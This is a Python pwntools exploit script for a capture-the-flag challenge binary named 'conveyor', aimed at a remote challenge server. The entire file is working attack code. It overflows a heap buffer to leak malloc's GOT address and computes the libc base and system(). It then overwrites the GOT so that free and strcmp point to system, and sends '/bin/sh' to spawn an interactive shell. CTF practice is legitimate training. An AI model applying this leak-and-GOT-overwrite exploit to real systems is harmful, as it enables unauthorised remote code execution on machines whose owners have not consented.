#!/usr/bin/python

from pwn import *

#p = process("./conveyor")
p = remote("jh2i.com" ,50020)
elf = ELF("conveyor")

remote = True

if remote:
    libc = ELF("libc6_2.27-3ubuntu1_amd64.so")
else:
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")




def add(data):
    p.recvuntil("> ")
    p.sendline("1")

    p.recvuntil("Enter part name: ")
    p.sendline(data)


def check(data, address):
    p.recvuntil("> ")
    p.sendline("2")

    p.recvuntil("Is this part safe? ")
    p.sendline("No")

    p.recvuntil("Enter a safe alternative: ")
    p.sendline(data)

    p.recvuntil("Next part:\n")
    leaked = u64(p.recv(6)+"\x00"*2)

    p.recvuntil("Enter a safe alternative: ")
    if address:
        p.sendline(address)
    else:
        p.sendline("Y\x00")

    return leaked

offset = 0x80
malloc = elf.got["malloc"]
free = elf.got["free"]

print "malloc @ ", hex(malloc)

payload = "M"*(0x80 - 0x8)


add(payload)

leak = check(payload + p64(malloc), "")
print "malloc @", hex(leak)
base_addr = leak - libc.sym["malloc"]
print "Libc base address @ ", hex(base_addr)
system_libc = base_addr + libc.sym["system"]
print "system @ ", hex(system_libc)

#free + puts + _stack + printf + fgets + strcmp + malloc + setvbuf + atoi + strstr [Order of libc functions in the GOT]


free_libc       = base_addr + libc.sym["free"]
puts_libc       = base_addr + libc.sym["puts"]
_stack          = p64(0x4006f6)
printf_libc     = base_addr + libc.sym["printf"]
fgets_libc      = base_addr + libc.sym["fgets"]         
strcmp_libc     = base_addr + libc.sym["strcmp"]
malloc_libc     = leak
setvbuf_libc    = base_addr + libc.sym["setvbuf"]
atoi_libc       = base_addr + libc.sym["atoi"]
strstr_libc     = base_addr + libc.sym["strstr"]

payload2    = p64(system_libc) 
payload2    += p64(puts_libc)
payload2    += _stack
payload2    += p64(printf_libc)
payload2    += p64(fgets_libc)
payload2    += p64(system_libc) #Notice that strcmp() changed to system()
payload2    += p64(malloc_libc)
payload2    += p64(setvbuf_libc)
payload2    += p64(atoi_libc) 
payload2    += p64(strstr_libc)

check(payload + p64(free), payload2) #This will change the whole GOT to mine.


p.sendline("/bin/sh") #Enjoy !

p.interactive()


